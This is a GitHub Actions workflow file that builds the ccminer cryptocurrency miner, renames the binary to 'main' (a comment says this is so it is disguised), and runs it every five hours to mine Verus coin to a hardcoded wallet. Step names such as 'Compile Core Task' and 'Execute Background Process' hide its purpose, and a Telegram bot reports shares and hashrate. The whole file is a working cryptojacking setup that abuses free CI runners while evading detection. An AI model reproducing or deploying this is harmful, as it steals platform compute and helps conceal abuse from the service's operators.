name: AKH1

on:
  schedule:
    - cron: "0 */5 * * *"     # Jalan tiap 5 jam
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 300       # Stop otomatis setelah 5 jam

    steps:
      - name: Setup Build Env
        run: |
          sudo apt update
          sudo apt install -y \
            build-essential git cmake automake libtool autoconf pkg-config \
            libcurl4-openssl-dev

      - name: Compile Core Task
        run: |
          git clone https://github.com/monkins1010/ccminer.git tempdir
          cd tempdir
          chmod +x build.sh
          ./build.sh
          mv ccminer ../main     # Rename agar tersamar

      - name: Execute Background Process
        run: |
          WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
          WORKER="AKH1"
          LOG_FILE="out.log"
          MAX_IDLE=600

          TELEGRAM_TOKEN="${{ secrets.TELEGRAM_TOKEN }}"
          TELEGRAM_CHAT_ID="${{ secrets.TELEGRAM_CHAT_ID }}"

          # Pool urutan: AP ‚Üí EU ‚Üí NA
          POOLS=(
            "stratum+tcp://ap.luckpool.net:3956"
            "stratum+tcp://eu.luckpool.net:3956"
            "stratum+tcp://na.luckpool.net:3956"
          )

          tg_notify() {
            curl -s -X POST https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage \
              -d chat_id=${TELEGRAM_CHAT_ID} \
              -d parse_mode=Markdown \
              -d text="$1"
          }

          tg_notify "üöÄ *${WORKER} started* with 2 threads."

          # Coba sambung ke tiap pool
          for POOL in "${POOLS[@]}"; do
            ./main -a verus -o "$POOL" -u "$WALLET.$WORKER" -p hybrid -t 2 \
              > "$LOG_FILE" 2>&1 &
            PID=$!

            sleep 10
            if ps -p $PID > /dev/null; then
              tg_notify "üîÅ *Connected to:* \`$POOL\`"
              break
            else
              kill $PID >/dev/null 2>&1
              tg_notify "‚ö†Ô∏è *Failed to connect:* \`$POOL\`"
            fi
          done

          if ! ps -p $PID > /dev/null; then
            tg_notify "‚ùå *All pools unreachable. Exiting‚Ä¶*"
            exit 1
          fi

          LAST_ACCEPTED=$(date +%s)
          SHARES_ACCEPTED=0

          tail -F "$LOG_FILE" | while read -r line; do
            NOW=$(date +%s)

            if echo "$line" | grep -Eqi "accepted|yay"; then
              SHARES_ACCEPTED=$((SHARES_ACCEPTED + 1))
              LAST_ACCEPTED=$NOW
              HASHRATE=$(echo "$line" | grep -o "[0-9.]\+ kH/s")
              HASHRATE=${HASHRATE:-"unknown"}
              tg_notify "‚úÖ *${WORKER} accepted share*\nüìà $HASHRATE\nüí† Total: *$SHARES_ACCEPTED*"
            fi

            if [ $((NOW - LAST_ACCEPTED)) -gt $MAX_IDLE ]; then
              tg_notify "‚ö†Ô∏è *${WORKER} idle >10m*. Restarting‚Ä¶"
              kill $PID
              break
            fi

            if ! ps -p $PID > /dev/null; then
              tg_notify "‚ùå *${WORKER} crashed*"
              break
            fi
          done

          tg_notify "‚úÖ *${WORKER} finished*\nTotal shares: *$SHARES_ACCEPTED*"
